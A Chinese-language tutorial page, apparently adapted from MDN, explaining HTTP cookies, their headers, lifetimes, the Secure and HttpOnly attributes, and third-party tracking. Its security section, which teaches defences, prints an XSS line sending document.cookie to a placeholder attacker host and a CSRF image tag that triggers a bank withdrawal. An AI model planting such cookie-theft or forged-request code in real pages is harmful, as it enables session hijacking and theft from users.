---
layout: page
title: HTTP Cookie
date: 2021-02-25 13:11:03
tags: 
  - 关于HTTP的那些事
categories: HTTP  
---

# HTTP Cookie

HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于[无状态](https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview#HTTP_is_stateless_but_not_sessionless)的HTTP协议记录稳定的状态信息成为了可能。

Cookie 主要用于以下三个方面：

- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
- 个性化设置（如用户自定义设置、主题等）
- 浏览器行为跟踪（如跟踪分析用户行为等）

## 1. [创建Cookie](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#创建cookie)

当服务器收到 HTTP 请求时，服务器可以在响应头里面添加一个 [`Set-Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie) 选项。浏览器收到响应后通常会保存下 Cookie，之后对该服务器每一次请求中都通过 [`Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie) 请求头部将 Cookie 信息发送给服务器。另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。

第一次：浏览器向服务器发送请求；

第二次：服务器收到请求，给响应头中添加Set-Cookie选项，并返回数据；

第三次；浏览器收到服务器发来的cookie，并保存。之后浏览器每次请求都会发cookie给服务器。

## 2. [`Set-Cookie响应头部`和`Cookie请求头部`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#set-cookie响应头部和cookie请求头部)

服务器使用 [`Set-Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie) 响应头部向用户代理（一般是浏览器）发送 Cookie信息。一个简单的 Cookie 可能像这样：

```
Set-Cookie: <cookie名>=<cookie值>
```

浏览器携带cookie：

```
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

## 3. [定义 Cookie 的生命周期](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#定义_cookie_的生命周期)

Cookie 的生命周期可以通过两种方式定义：

- 会话期 Cookie 是最简单的 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期Cookie不需要指定过期时间（`Expires`）或者有效期（`Max-Age`）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期Cookie 也会被保留下来，就好像浏览器从来没有关闭一样，这会导致 Cookie 的生命周期无限期延长。
- 持久性 Cookie 的生命周期取决于过期时间（`Expires`）或有效期（`Max-Age`）指定的一段时间。

例如：

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

**提示：**当Cookie的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。

如果您的站点对用户进行身份验证，则每当用户进行身份验证时，它都应重新生成并重新发送会话 Cookie，甚至是已经存在的会话 Cookie。此技术有助于防止[会话固定攻击（session fixation attacks）](https://wiki.developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#Session_fixation)，在该攻击中第三方可以重用用户的会话。

## 4. 限制访问Cookie

两种方法可确保Cookie被安全发送。Secure属性和HttpOnly属性。

`Secure`： 标记为 `Secure` 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端，因此可以预防 [man-in-the-middle](https://developer.mozilla.org/zh-CN/docs/Glossary/MitM) 攻击者的攻击。

`HttpOnly`：JavaScript [`Document.cookie`](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie) API 无法访问带有 `HttpOnly` 属性的cookie；此类 Cookie 仅作用于服务器。例如，持久化服务器端会话的 Cookie 不需要对 JavaScript 可用，而应具有 `HttpOnly` 属性。此预防措施有助于缓解[跨站点脚本（XSS）](https://wiki.developer.mozilla.org/zh-CN/docs/Web/Security/Types_of_attacks#Cross-site_scripting_(XSS))攻击。

> 注意：不安全的站点（`http:`）无法使用Cookie的 `Secure` 标记。

## 5. 安全

> 信息被存在 Cookie 中时，需要明白 cookie 的值时可以被访问，且可以被终端用户所修改的。

缓解涉及Cookie的攻击的方法：

- 使用 `HttpOnly` 属性可防止通过 JavaScript 访问 cookie 值。
- 用于敏感信息（例如指示身份验证）的 Cookie 的生存期应较短，并且 `SameSite` 属性设置为`Strict` 或 `Lax`。（请参见上方的 [SameSite Cookie](https://wiki.developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies$edit#)。）在[支持 SameSite 的浏览器](https://wiki.developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Browser_compatibility)中，这样做的作用是确保不与跨域请求一起发送身份验证 cookie，因此，这种请求实际上不会向应用服务器进行身份验证。

### [会话劫持和 XSS](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#会话劫持和_xss)

在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 [XSS](https://developer.mozilla.org/en-US/docs/Glossary/XSS) 攻击。

```
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

`HttpOnly` 类型的 Cookie 用于阻止了JavaScript 对其的访问性而能在一定程度上缓解此类攻击。

### [跨站请求伪造（CSRF）](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#跨站请求伪造（csrf）)

[维基百科](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery)已经给了一个比较好的 [CSRF](https://developer.mozilla.org/zh-CN/docs/Glossary/CSRF) 例子。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：

```
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：

- 对用户输入进行过滤来阻止 [XSS](https://developer.mozilla.org/en-US/docs/Glossary/XSS)；
- 任何敏感操作都需要确认；
- 用于敏感信息的 Cookie 只能拥有较短的生命周期；
- 更多方法可以查看[OWASP CSRF prevention cheat sheet](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet)。

## 6. [跟踪和隐私](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#跟踪和隐私)

### [第三方 Cookie](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#第三方_cookie)

Cookie 与域关联。如果此域与您所在页面的域相同，则该 cookie 称为*第一方 cookie（ first-party cookie）*。如果域不同，则它是*第三方 cookie（third-party cookie）*。当托管网页的服务器设置第一方 Cookie 时，该页面可能包含存储在其他域中的服务器上的图像或其他组件（例如，广告横幅），这些图像或其他组件可能会设置第三方 Cookie。这些主要用于在网络上进行广告和跟踪。例如，[types of cookies used by Google](https://policies.google.com/technologies/types)。第三方服务器可以基于同一浏览器在访问多个站点时发送给它的 cookie 来建立用户浏览历史和习惯的配置文件。Firefox 默认情况下会阻止已知包含跟踪器的第三方 cookie。第三方cookie（或仅跟踪 cookie）也可能被其他浏览器设置或扩展程序阻止。阻止 Cookie 会导致某些第三方组件（例如社交媒体窗口小部件）无法正常运行。
